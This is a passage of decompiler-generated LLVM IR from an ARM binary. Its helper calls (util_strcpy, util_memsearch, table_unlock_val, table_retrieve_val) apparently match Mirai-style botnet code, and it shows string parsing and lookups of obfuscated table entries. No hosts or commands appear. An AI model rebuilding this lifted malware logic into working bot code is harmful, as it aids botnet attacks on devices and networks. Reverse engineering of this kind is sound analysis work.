  store i32 %v1_9ba0, i32* @r5, align 4
  %v0_9ba4 = load i32, i32* @sl, align 4
  %v1_9ba4 = add i32 %v0_9ba4, 660
  %v2_9ba4 = inttoptr i32 %v1_9ba4 to i32*
  %v3_9ba4 = load i32, i32* %v2_9ba4, align 4
  %v0_9ba8 = load i32, i32* @r7, align 4
  %v2_9ba8 = add i32 %v0_9ba8, %v1_9ba0
  store i32 %v2_9ba8, i32* @r6, align 4
  %v2_9bac = sub i32 %v3_9ba4, %v1_9ba0
  store i32 %v2_9bac, i32* %r1.global-to-local, align 4
  %v0_9bb0 = load i32, i32* @r8, align 4
  store i32 %v0_9bb0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b424.59 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9ba8, i32* %r0.global-to-local, align 4
  %v4_9bbc = call i32 @util_memsearch(i32 %v2_9ba8, i32 %v2_9bac, i32 ptrtoint (i32* @global_var_1b424.59 to i32), i32 %v0_9bb0)
  store i32 %v4_9bbc, i32* %r0.global-to-local, align 4
  %v0_9bc0 = load i32, i32* @sl, align 4
  %v1_9bc0 = add i32 %v0_9bc0, 16
  %v2_9bc0 = inttoptr i32 %v1_9bc0 to i32*
  %v3_9bc0 = load i32, i32* %v2_9bc0, align 4
  %v1_9bc4 = and i32 %v3_9bc0, 33554432
  %v2_9bc4 = icmp ne i32 %v1_9bc4, 0
  store i1 %v2_9bc4, i1* %cpsr_c.global-to-local, align 1
  %v3_9bc4 = mul i32 %v3_9bc0, 128
  %v1_9bc8 = add i32 %v3_9bc4, 1472
  %v0_9bcc = load i32, i32* %sb.global-to-local, align 4
  %v1_9bcc = load i32, i32* @r5, align 4
  %v2_9bd0 = add i32 %v1_9bc8, %v0_9bcc
  store i32 %v2_9bd0, i32* @r4, align 4
  %v2_9bcc = add i32 %v0_9bcc, %v4_9bbc
  %v2_9bd4 = add i32 %v2_9bcc, %v1_9bcc
  store i32 %v2_9bd4, i32* @r5, align 4
  %v0_9bd8 = load i32, i32* %fp.global-to-local, align 4
  %v1_9bd8 = trunc i32 %v0_9bd8 to i8
  %v3_9bd8 = add i32 %v2_9bd4, 2115
  %v4_9bd8 = inttoptr i32 %v3_9bd8 to i8*
  store i8 %v1_9bd8, i8* %v4_9bd8, align 1
  %v0_9bdc = load i32, i32* @r4, align 4
  store i32 %v0_9bdc, i32* %r0.global-to-local, align 4
  %v1_9be0 = inttoptr i32 %v0_9bdc to i8*
  %v2_9be0 = call i32 @util_strlen(i8* %v1_9be0)
  %v0_9be4 = load i32, i32* @r6, align 4
  store i32 %v0_9be4, i32* %r1.global-to-local, align 4
  %v0_9be8 = load i32, i32* @r4, align 4
  %v2_9be8 = add i32 %v0_9be8, %v2_9be0
  store i32 %v2_9be8, i32* @r0, align 4
  %v2_9bec = inttoptr i32 %v2_9be8 to i8*
  %v3_9bec = call i32 @util_strcpy(i8* %v2_9bec, i32 %v0_9be4)
  store i32 %v3_9bec, i32* %r0.global-to-local, align 4
  %v0_9bf0 = load i32, i32* @sl, align 4
  %v1_9bf0 = add i32 %v0_9bf0, 16
  %v2_9bf0 = inttoptr i32 %v1_9bf0 to i32*
  %v3_9bf0 = load i32, i32* %v2_9bf0, align 4
  %v1_9bf4 = add i32 %v3_9bf0, 1
  store i32 %v1_9bf4, i32* %r3.global-to-local, align 4
  store i32 %v1_9bf4, i32* %v2_9bf0, align 4
  br label %dec_label_pc_99ec

dec_label_pc_9c00:                                ; preds = %dec_label_pc_9644
  %v0_9c00 = load i32, i32* %sb.global-to-local, align 4
  %v1_9c04 = add i32 %v0_9c00, 533
  store i32 %v1_9c04, i32* @r4, align 4
  store i32 %v1_9c04, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9c10 = call i32 @util_zero(i32 %v1_9c04, i32 255)
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v3_9c18 = load i32, i32* %stack_var_-44, align 4
  %v0_9c1c = load i32, i32* @r6, align 4
  %v1_9c1c = add i32 %v0_9c1c, 1
  store i32 %v1_9c1c, i32* @r6, align 4
  %v2_9c20 = add i32 %v1_9c1c, %v3_9c18
  store i32 %v2_9c20, i32* %r0.global-to-local, align 4
  %v1_9c24 = inttoptr i32 %v2_9c20 to i8*
  %v2_9c24 = call i32 @util_strlen(i8* %v1_9c24)
  store i32 %v2_9c24, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9c28 = icmp eq i32 %v2_9c24, 0
  store i1 %v2_9c28, i1* %cpsr_z.global-to-local, align 1
  %tmp212 = icmp slt i32 %v2_9c24, 1
  br i1 %tmp212, label %dec_label_pc_9654, label %dec_label_pc_9c30

dec_label_pc_9c30:                                ; preds = %dec_label_pc_9c00
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_9c34 = load i32, i32* %stack_var_-44, align 4
  %v0_9c38 = load i32, i32* @r6, align 4
  %v2_9c38 = add i32 %v0_9c38, %v3_9c34
  store i32 %v2_9c38, i32* %r0.global-to-local, align 4
  %v1_9c3c = inttoptr i32 %v2_9c38 to i8*
  %v2_9c3c = call i32 @util_strlen(i8* %v1_9c3c)
  store i32 %v2_9c3c, i32* %r0.global-to-local, align 4
  %v2_9c40 = icmp ugt i32 %v2_9c3c, 254
  store i1 %v2_9c40, i1* %cpsr_c.global-to-local, align 1
  %v7_9c40 = icmp eq i32 %v2_9c3c, 255
  store i1 %v7_9c40, i1* %cpsr_z.global-to-local, align 1
  %v8_9c44 = icmp sgt i32 %v2_9c3c, 255
  br i1 %v8_9c44, label %dec_label_pc_9654, label %dec_label_pc_9c48

dec_label_pc_9c48:                                ; preds = %dec_label_pc_9c30
  store i32 %v10_82f0, i32* %ip.global-to-local, align 4
  %v3_9c4c = load i32, i32* %stack_var_-44, align 4
  %v0_9c50 = load i32, i32* @r4, align 4
  store i32 %v0_9c50, i32* @r0, align 4
  %v0_9c54 = load i32, i32* @r6, align 4
  %v2_9c54 = add i32 %v0_9c54, %v3_9c4c
  store i32 %v2_9c54, i32* %r1.global-to-local, align 4
  %v2_9c58 = inttoptr i32 %v0_9c50 to i8*
  %v3_9c58 = call i32 @util_strcpy(i8* %v2_9c58, i32 %v2_9c54)
  store i32 %v3_9c58, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9654

dec_label_pc_9c60:                                ; preds = %dec_label_pc_98e0
  store i32 7, i32* @ip, align 4
  store i32 %v10_82f0, i32* @lr, align 4
  store i32 7, i32* %stack_var_-44, align 4
  %v0_9c6c = load i32, i32* @r6, align 4
  %v1_9c6c = add i32 %v0_9c6c, 4
  %v2_9c6c = inttoptr i32 %v1_9c6c to i8*
  %v3_9c6c = load i8, i8* %v2_9c6c, align 1
  %v4_9c6c = zext i8 %v3_9c6c to i32
  store i32 %v4_9c6c, i32* @r3, align 4
  %v2_9c70 = icmp ugt i8 %v3_9c6c, 114
  store i1 %v2_9c70, i1* %cpsr_c.global-to-local, align 1
  %v7_9c70 = icmp eq i8 %v3_9c6c, 115
  store i1 %v7_9c70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9c70, label %bb213, label %.thread47

bb213:                                            ; preds = %dec_label_pc_9c60
  store i32 8, i32* @ip, align 4
  store i32 8, i32* %stack_var_-44, align 4
  br label %.thread47

.thread47:                                        ; preds = %dec_label_pc_9c60, %bb213
  %v3_9c80 = phi i32 [ 7, %dec_label_pc_9c60 ], [ 8, %bb213 ]
  %v1_9c84 = sub nsw i32 1, %v3_9c80
  %v1_9c88 = load i32, i32* @r7, align 4
  %v2_9c88 = add i32 %v1_9c88, %v1_9c84
  store i32 %v2_9c88, i32* @r2, align 4
  %v2_9c8c = add i32 %v3_9c80, %v0_9c6c
  store i32 %v2_9c8c, i32* @r1, align 4
  store i32 %v0_9c6c, i32* @r0, align 4
  %v3_9c94 = call i32 @memmove(i32 %v0_9c6c, i32 %v2_9c8c, i32 %v2_9c88)
  store i32 %v3_9c94, i32* %r0.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v0_9ca4 = load i32, i32* @r5, align 4
  %v1_9ca4 = load i32, i32* @r4, align 4
  %v2_9ca4 = add i32 %v1_9ca4, %v0_9ca4
  %v3_9ca4 = inttoptr i32 %v2_9ca4 to i8*
  %v4_9ca4 = load i8, i8* %v3_9ca4, align 1
  %v6_9ca4 = zext i8 %v4_9ca4 to i32
  store i32 %v6_9ca4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_9ca8 = icmp eq i8 %v4_9ca4, 0
  store i1 %v9_9ca8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9ca8, label %dec_label_pc_9ce8, label %dec_label_pc_9cb0

dec_label_pc_9cb0:                                ; preds = %.thread47
  %v2_9cb0 = icmp ugt i8 %v4_9ca4, 46
  store i1 %v2_9cb0, i1* %cpsr_c.global-to-local, align 1
  %v7_9cb0 = icmp eq i8 %v4_9ca4, 47
  store i1 %v7_9cb0, i1* %cpsr_z.global-to-local, align 1
  %v1_9cb4 = load i32, i32* @r6, align 4
  br i1 %v7_9cb0, label %bb214, label %dec_label_pc_9cbc

bb214:                                            ; preds = %dec_label_pc_9cb0
  store i32 %v1_9cb4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_9d68

dec_label_pc_9cbc:                                ; preds = %dec_label_pc_9cb0
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9ccc

dec_label_pc_9cc4:                                ; preds = %dec_label_pc_9ccc
  %v2_9cc4 = icmp ugt i8 %v4_9cd8, 46
  store i1 %v2_9cc4, i1* %cpsr_c.global-to-local, align 1
  %v7_9cc4 = icmp eq i8 %v4_9cd8, 47
  store i1 %v7_9cc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9cc4, label %dec_label_pc_9d68, label %dec_label_pc_9ccc

dec_label_pc_9ccc:                                ; preds = %dec_label_pc_9cc4, %dec_label_pc_9cbc
  %v0_9ccc = phi i32 [ %v1_9ccc, %dec_label_pc_9cc4 ], [ 0, %dec_label_pc_9cbc ]
  %v1_9ccc = add i32 %v0_9ccc, 1
  store i32 %v1_9ccc, i32* %r1.global-to-local, align 4
  store i32 %v10_82f0, i32* @ip, align 4
  store i32 %v1_9ccc, i32* %stack_var_-44, align 4
  %v2_9cd8 = add i32 %v1_9ccc, %v1_9cb4
  %v3_9cd8 = inttoptr i32 %v2_9cd8 to i8*
  %v4_9cd8 = load i8, i8* %v3_9cd8, align 1
  %v6_9cd8 = zext i8 %v4_9cd8 to i32
  store i32 %v6_9cd8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9cdc = icmp eq i8 %v4_9cd8, 0
  store i1 %v2_9cdc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_9cd8, i32* %r2.global-to-local, align 4
  br i1 %v2_9cdc, label %dec_label_pc_9ce8, label %dec_label_pc_9cc4

dec_label_pc_9ce8:                                ; preds = %dec_label_pc_9ccc, %.thread47, %dec_label_pc_9d68
  %v0_9ce8 = load i32, i32* @r6, align 4
  store i32 %v0_9ce8, i32* %r0.global-to-local, align 4
  %v1_9cec = inttoptr i32 %v0_9ce8 to i8*
  %v2_9cec = call i32 @util_strlen(i8* %v1_9cec)
  store i32 %v2_9cec, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9cf0 = icmp eq i32 %v2_9cec, 0
  store i1 %v2_9cf0, i1* %cpsr_z.global-to-local, align 1
  %tmp215 = icmp slt i32 %v2_9cec, 1
  br i1 %tmp215, label %dec_label_pc_9d08, label %dec_label_pc_9cf8

dec_label_pc_9cf8:                                ; preds = %dec_label_pc_9ce8
  %v0_9cf8 = load i32, i32* @r6, align 4
  store i32 %v0_9cf8, i32* %r0.global-to-local, align 4
  %v1_9cfc = inttoptr i32 %v0_9cf8 to i8*
  %v2_9cfc = call i32 @util_strlen(i8* %v1_9cfc)
  store i32 %v2_9cfc, i32* %r0.global-to-local, align 4
  %v2_9d00 = icmp ugt i32 %v2_9cfc, 126
  store i1 %v2_9d00, i1* %cpsr_c.global-to-local, align 1
  %v7_9d00 = icmp eq i32 %v2_9cfc, 127
  store i1 %v7_9d00, i1* %cpsr_z.global-to-local, align 1
  %v7_9d04 = icmp slt i32 %v2_9cfc, 128
  br i1 %v7_9d04, label %dec_label_pc_9ec8, label %dec_label_pc_9d08

dec_label_pc_9d08:                                ; preds = %dec_label_pc_9cf8, %dec_label_pc_9ce8, %dec_label_pc_9ec8
  store i32 %v10_82f0, i32* @lr, align 4
  %v3_9d0c = load i32, i32* %stack_var_-44, align 4
  %v0_9d10 = load i32, i32* @r6, align 4
  %v1_9d10 = add i32 %v0_9d10, 1
  store i32 %v1_9d10, i32* @r5, align 4
  %v2_9d14 = add i32 %v1_9d10, %v3_9d0c
  store i32 %v2_9d14, i32* %r0.global-to-local, align 4
  %v1_9d18 = inttoptr i32 %v2_9d14 to i8*
  %v2_9d18 = call i32 @util_strlen(i8* %v1_9d18)
  store i32 %v2_9d18, i32* %r0.global-to-local, align 4
  %v2_9d1c = icmp ugt i32 %v2_9d18, 254
  store i1 %v2_9d1c, i1* %cpsr_c.global-to-local, align 1
  %v7_9d1c = icmp eq i32 %v2_9d18, 255
  store i1 %v7_9d1c, i1* %cpsr_z.global-to-local, align 1
  %v8_9d20 = icmp sgt i32 %v2_9d18, 255
  br i1 %v8_9d20, label %dec_label_pc_9918, label %dec_label_pc_9d24

dec_label_pc_9d24:                                ; preds = %dec_label_pc_9d08
  %v0_9d24 = load i32, i32* %sb.global-to-local, align 4
  %v1_9d28 = add i32 %v0_9d24, 533
  store i32 %v1_9d28, i32* @r4, align 4
  store i32 %v1_9d28, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9d34 = call i32 @util_zero(i32 %v1_9d28, i32 255)
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_9d3c = load i32, i32* %stack_var_-44, align 4
  %v0_9d40 = load i32, i32* @r5, align 4
  %v2_9d40 = add i32 %v0_9d40, %v3_9d3c
  store i32 %v2_9d40, i32* %r0.global-to-local, align 4
  %v1_9d44 = inttoptr i32 %v2_9d40 to i8*
  %v2_9d44 = call i32 @util_strlen(i8* %v1_9d44)
  store i32 %v2_9d44, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9d48 = icmp eq i32 %v2_9d44, 0
  store i1 %v2_9d48, i1* %cpsr_z.global-to-local, align 1
  %tmp216 = icmp slt i32 %v2_9d44, 1
  br i1 %tmp216, label %dec_label_pc_9918, label %dec_label_pc_9d50

dec_label_pc_9d50:                                ; preds = %dec_label_pc_9d24
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v3_9d54 = load i32, i32* %stack_var_-44, align 4
  %v0_9d58 = load i32, i32* @r4, align 4
  store i32 %v0_9d58, i32* @r0, align 4
  %v0_9d5c = load i32, i32* @r5, align 4
  %v2_9d5c = add i32 %v0_9d5c, %v3_9d54
  store i32 %v2_9d5c, i32* %r1.global-to-local, align 4
  %v2_9d60 = inttoptr i32 %v0_9d58 to i8*
  %v3_9d60 = call i32 @util_strcpy(i8* %v2_9d60, i32 %v2_9d5c)
  store i32 %v3_9d60, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9918

dec_label_pc_9d68:                                ; preds = %dec_label_pc_9cc4, %bb214
  %v2_9d6c = phi i32 [ %v1_9cb4, %bb214 ], [ %v2_9cd8, %dec_label_pc_9cc4 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_9d6c = inttoptr i32 %v2_9d6c to i8*
  store i8 0, i8* %v3_9d6c, align 1
  br label %dec_label_pc_9ce8

dec_label_pc_9d74:                                ; preds = %dec_label_pc_9898
  %v1_9d74 = add i32 %v0_9d74, 1
  store i32 %v1_9d74, i32* %ip.global-to-local, align 4
  %v2_9d78 = add i32 %v0_9898, %v1_9d74
  store i32 %v2_9d78, i32* %r4.global-to-local, align 4
  store i32 %v10_82f0, i32* @lr, align 4
  store i32 %v2_9d78, i32* %r0.global-to-local, align 4
  store i32 %v1_9d74, i32* %stack_var_-44, align 4
  %v1_9d88 = inttoptr i32 %v2_9d78 to i8*
  %v2_9d88 = call i32 @util_strlen(i8* %v1_9d88)
  store i32 %v2_9d88, i32* %r0.global-to-local, align 4
  %v0_9d8c = load i32, i32* %r4.global-to-local, align 4
  %v2_9d8c = add i32 %v0_9d8c, %v2_9d88
  %v1_9d90 = add i32 %v2_9d8c, -1
  %v2_9d90 = inttoptr i32 %v1_9d90 to i8*
  %v3_9d90 = load i8, i8* %v2_9d90, align 1
  %v4_9d90 = zext i8 %v3_9d90 to i32
  store i32 %v4_9d90, i32* %r3.global-to-local, align 4
  %v2_9d94 = icmp ugt i8 %v3_9d90, 33
  store i1 %v2_9d94, i1* %cpsr_c.global-to-local, align 1
  %v7_9d94 = icmp eq i8 %v3_9d90, 34
  store i1 %v7_9d94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9d94, label %dec_label_pc_9d9c, label %dec_label_pc_98a4

dec_label_pc_9d9c:                                ; preds = %dec_label_pc_9d74
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_9da0 = load i32, i32* %stack_var_-44, align 4
  %v0_9da4 = load i32, i32* @r5, align 4
  %v2_9da4 = add i32 %v0_9da4, %v3_9da0
  store i32 %v2_9da4, i32* %r4.global-to-local, align 4
  store i32 %v2_9da4, i32* %r0.global-to-local, align 4
  %v1_9dac = inttoptr i32 %v2_9da4 to i8*
  %v2_9dac = call i32 @util_strlen(i8* %v1_9dac)
  store i32 %v2_9dac, i32* %r0.global-to-local, align 4
  %v2_9db0 = add i32 %v2_9da4, %v2_9dac
  %v0_9db4 = load i32, i32* @r6, align 4
  %v1_9db4 = trunc i32 %v0_9db4 to i8
  %v3_9db4 = add i32 %v2_9db0, -1
  %v4_9db4 = inttoptr i32 %v3_9db4 to i8*
  store i8 %v1_9db4, i8* %v4_9db4, align 1
  br label %dec_label_pc_98a4

dec_label_pc_9dbc:                                ; preds = %dec_label_pc_990c
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_9dc0 = load i32, i32* %stack_var_-44, align 4
  %v0_9dc4 = load i32, i32* @r6, align 4
  %v1_9dc4 = add i32 %v0_9dc4, 1
  store i32 %v1_9dc4, i32* @r5, align 4
  %v2_9dc8 = add i32 %v1_9dc4, %v3_9dc0
  store i32 %v2_9dc8, i32* %r0.global-to-local, align 4
  %v1_9dcc = inttoptr i32 %v2_9dc8 to i8*
  %v2_9dcc = call i32 @util_strlen(i8* %v1_9dcc)
  store i32 %v2_9dcc, i32* %r0.global-to-local, align 4
  %v2_9dd0 = icmp ugt i32 %v2_9dcc, 254
  store i1 %v2_9dd0, i1* %cpsr_c.global-to-local, align 1
  %v7_9dd0 = icmp eq i32 %v2_9dcc, 255
  store i1 %v7_9dd0, i1* %cpsr_z.global-to-local, align 1
  %v8_9dd4 = icmp sgt i32 %v2_9dcc, 255
  br i1 %v8_9dd4, label %dec_label_pc_9918, label %dec_label_pc_9dd8

dec_label_pc_9dd8:                                ; preds = %dec_label_pc_9dbc
  %v0_9dd8 = load i32, i32* %sb.global-to-local, align 4
  %v1_9ddc = add i32 %v0_9dd8, 533
  store i32 %v1_9ddc, i32* @r4, align 4
  store i32 %v1_9ddc, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9de8 = call i32 @util_zero(i32 %v1_9ddc, i32 255)
  store i32 %v10_82f0, i32* @ip, align 4
  %v3_9df0 = load i32, i32* %stack_var_-44, align 4
  %v0_9df4 = load i32, i32* @r5, align 4
  %v2_9df4 = add i32 %v0_9df4, %v3_9df0
  store i32 %v2_9df4, i32* %r0.global-to-local, align 4
  %v1_9df8 = inttoptr i32 %v2_9df4 to i8*
  %v2_9df8 = call i32 @util_strlen(i8* %v1_9df8)
  store i32 %v2_9df8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9dfc = icmp eq i32 %v2_9df8, 0
  store i1 %v2_9dfc, i1* %cpsr_z.global-to-local, align 1
  %tmp217 = icmp slt i32 %v2_9df8, 1
  br i1 %tmp217, label %dec_label_pc_9918, label %dec_label_pc_9e04

dec_label_pc_9e04:                                ; preds = %dec_label_pc_9dd8
  store i32 %v10_82f0, i32* @lr, align 4
  %v3_9e08 = load i32, i32* %stack_var_-44, align 4
  %v0_9e0c = load i32, i32* @r4, align 4
  store i32 %v0_9e0c, i32* @r0, align 4
  %v0_9e10 = load i32, i32* @r5, align 4
  %v2_9e10 = add i32 %v0_9e10, %v3_9e08
  store i32 %v2_9e10, i32* %r1.global-to-local, align 4
  %v2_9e14 = inttoptr i32 %v0_9e0c to i8*
  %v3_9e14 = call i32 @util_strcpy(i8* %v2_9e14, i32 %v2_9e10)
  store i32 %v3_9e14, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9918

dec_label_pc_9e1c:                                ; preds = %dec_label_pc_84c0
  store i32 50, i32* %r0.global-to-local, align 4
  %v1_9e20 = call i32 @table_unlock_val(i32 50)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 50, i32* %r0.global-to-local, align 4
  %v3_9e2c = call i32 @table_retrieve_val(i32 50, i32* null)
  store i32 %v3_9e2c, i32* %r1.global-to-local, align 4
  %v0_9e34 = load i32, i32* @r5, align 4
  %v1_9e34 = add i32 %v0_9e34, 20
  store i32 %v1_9e34, i32* @r0, align 4
  %v2_9e38 = inttoptr i32 %v1_9e34 to i8*
  %v3_9e38 = call i32 @util_strcpy(i8* %v2_9e38, i32 %v3_9e2c)
  store i32 50, i32* %r0.global-to-local, align 4
  %v1_9e40 = call i32 @table_lock_val(i32 50)
  store i32 %v1_9e40, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9e44

dec_label_pc_9e44:                                ; preds = %dec_label_pc_84c0, %dec_label_pc_9f34, %dec_label_pc_9f08, %dec_label_pc_9edc, %dec_label_pc_9e9c, %dec_label_pc_9e1c
  store i32 %v0_840c, i32* @r0, align 4
  %v0_9e48 = load i32, i32* @r8, align 4
  store i32 %v0_9e48, i32* %r1.global-to-local, align 4
  %v2_9e4c = inttoptr i32 %v0_840c to i8*
  %v3_9e4c = call i32 @util_strcpy(i8* %v2_9e4c, i32 %v0_9e48)
  store i32 %v3_9e4c, i32* %r0.global-to-local, align 4
  store i32 %v0_839c, i32* %r2.global-to-local, align 4
  %v0_9e54 = load i32, i32* %fp.global-to-local, align 4
  %v1_9e54 = add i32 %v0_9e54, 1
  store i32 %v1_9e54, i32* %fp.global-to-local, align 4
  %v0_9e58 = load i32, i32* @r5, align 4
  %v3_9e5c = icmp uge i32 %v1_9e54, %v0_839c
  store i1 %v3_9e5c, i1* %cpsr_c.global-to-local, align 1
  %v9_9e5c = icmp eq i32 %v1_9e54, %v0_839c
  store i1 %v9_9e5c, i1* %cpsr_z.global-to-local, align 1
  %v1_9e60 = add i32 %v0_9e58, 3140
  store i32 %v1_9e60, i32* @r5, align 4
  br i1 %v9_9e5c, label %dec_label_pc_9e68, label %dec_label_pc_83cc

dec_label_pc_9e68:                                ; preds = %dec_label_pc_9e44
  %v0_9e78 = load i32, i32* @r7, align 4
  %v1_9e78 = and i32 %v0_9e78, 128
  %v2_9e78 = icmp ne i32 %v1_9e78, 0
  store i1 %v2_9e78, i1* %cpsr_c.global-to-local, align 1
  %v3_9e78 = udiv i32 %v0_9e78, 256
  %v1_9e7c = add i32 %v2_83b0, 1452
  store i32 %v1_9e7c, i32* %r3.global-to-local, align 4
  %v2_9e80 = ptrtoint i32* %stack_var_-10572 to i32
  store i32 %v2_9e80, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_852c.preheader

dec_label_pc_9e9c:                                ; preds = %dec_label_pc_84c0
  store i32 51, i32* %r0.global-to-local, align 4
  %v1_9ea0 = call i32 @table_unlock_val(i32 51)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 51, i32* %r0.global-to-local, align 4
  %v3_9eac = call i32 @table_retrieve_val(i32 51, i32* null)
  store i32 %v3_9eac, i32* %r1.global-to-local, align 4
  %v0_9eb4 = load i32, i32* @r5, align 4
  %v1_9eb4 = add i32 %v0_9eb4, 20
  store i32 %v1_9eb4, i32* @r0, align 4
  %v2_9eb8 = inttoptr i32 %v1_9eb4 to i8*
  %v3_9eb8 = call i32 @util_strcpy(i8* %v2_9eb8, i32 %v3_9eac)
  store i32 51, i32* %r0.global-to-local, align 4
  %v1_9ec0 = call i32 @table_lock_val(i32 51)
  store i32 %v1_9ec0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9e44

dec_label_pc_9ec8:                                ; preds = %dec_label_pc_9cf8
  %v0_9ec8 = load i32, i32* %sb.global-to-local, align 4
  %v0_9ecc = load i32, i32* @r6, align 4
  store i32 %v0_9ecc, i32* %r1.global-to-local, align 4
  %v1_9ed0 = add i32 %v0_9ec8, 789
  store i32 %v1_9ed0, i32* @r0, align 4
  %v2_9ed4 = inttoptr i32 %v1_9ed0 to i8*
  %v3_9ed4 = call i32 @util_strcpy(i8* %v2_9ed4, i32 %v0_9ecc)
  store i32 %v3_9ed4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9d08

dec_label_pc_9edc:                                ; preds = %dec_label_pc_84c0
  store i32 48, i32* %r0.global-to-local, align 4
  %v1_9ee0 = call i32 @table_unlock_val(i32 48)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 48, i32* %r0.global-to-local, align 4
  %v3_9eec = call i32 @table_retrieve_val(i32 48, i32* null)
  store i32 %v3_9eec, i32* %r1.global-to-local, align 4
  %v0_9ef4 = load i32, i32* @r5, align 4
  %v1_9ef4 = add i32 %v0_9ef4, 20
  store i32 %v1_9ef4, i32* @r0, align 4
  %v2_9ef8 = inttoptr i32 %v1_9ef4 to i8*
  %v3_9ef8 = call i32 @util_strcpy(i8* %v2_9ef8, i32 %v3_9eec)
  store i32 48, i32* %r0.global-to-local, align 4
  %v1_9f00 = call i32 @table_lock_val(i32 48)
  store i32 %v1_9f00, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9e44

dec_label_pc_9f08:                                ; preds = %dec_label_pc_84c0
  store i32 47, i32* %r0.global-to-local, align 4
  %v1_9f0c = call i32 @table_unlock_val(i32 47)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 47, i32* %r0.global-to-local, align 4
  %v3_9f18 = call i32 @table_retrieve_val(i32 47, i32* null)
  store i32 %v3_9f18, i32* %r1.global-to-local, align 4
  %v0_9f20 = load i32, i32* @r5, align 4
  %v1_9f20 = add i32 %v0_9f20, 20
  store i32 %v1_9f20, i32* @r0, align 4
  %v2_9f24 = inttoptr i32 %v1_9f20 to i8*
  %v3_9f24 = call i32 @util_strcpy(i8* %v2_9f24, i32 %v3_9f18)
  store i32 47, i32* %r0.global-to-local, align 4
  %v1_9f2c = call i32 @table_lock_val(i32 47)
  store i32 %v1_9f2c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9e44

dec_label_pc_9f34:                                ; preds = %dec_label_pc_84c0
  store i32 49, i32* %r0.global-to-local, align 4
  %v1_9f38 = call i32 @table_unlock_val(i32 49)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 49, i32* %r0.global-to-local, align 4
  %v3_9f44 = call i32 @table_retrieve_val(i32 49, i32* null)
  store i32 %v3_9f44, i32* %r1.global-to-local, align 4
  %v0_9f4c = load i32, i32* @r5, align 4
  %v1_9f4c = add i32 %v0_9f4c, 20
  store i32 %v1_9f4c, i32* @r0, align 4
  %v2_9f50 = inttoptr i32 %v1_9f4c to i8*
  %v3_9f50 = call i32 @util_strcpy(i8* %v2_9f50, i32 %v3_9f44)
  store i32 49, i32* %r0.global-to-local, align 4
  %v1_9f58 = call i32 @table_lock_val(i32 49)
  store i32 %v1_9f58, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9e44

; uselistorder directives
  uselistorder i32 %v2_9e80, { 1, 0 }
  uselistorder i32 %v1_9e7c, { 1, 0 }
  uselistorder i32 %v0_9e78, { 0, 2, 1 }
  uselistorder i32 %v1_9e60, { 1, 0 }
  uselistorder i32 %v1_9d74, { 1, 0, 2 }
  uselistorder i8 %v4_9cd8, { 2, 3, 1, 0 }
  uselistorder i32 %v1_9ccc, { 0, 2, 3, 1 }
  uselistorder i1 %v7_9cc4, { 1, 0 }
  uselistorder i32 %v1_9cb4, { 1, 0, 2 }
  uselistorder i1 %v7_9cb0, { 1, 0 }
  uselistorder i1 %v9_9ca8, { 1, 0 }
  uselistorder i32 %v0_9c6c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_9bcc, { 1, 0 }
  uselistorder i32 %v2_9ba8, { 1, 0, 2 }
  uselistorder i32 %v1_9ba0, { 1, 0, 2 }
  uselistorder i32 %v1_9b28, { 0, 2, 1 }
  uselistorder i32 %v0_9b28, { 0, 2, 1 }
  uselistorder i32 %v2_9a9c, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i8 %v4_9a74, { 2, 3, 1, 0 }
  uselistorder i32 %v1_9a68, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_9a60, { 1, 0 }
  uselistorder i32 %v1_9a50, { 1, 0, 2 }
  uselistorder i1 %v7_9a4c, { 1, 0 }
  uselistorder i32 %v0_9a0c, { 2, 0, 1, 3 }
  uselistorder i32 %v3_99d0, { 2, 0, 1, 3 }
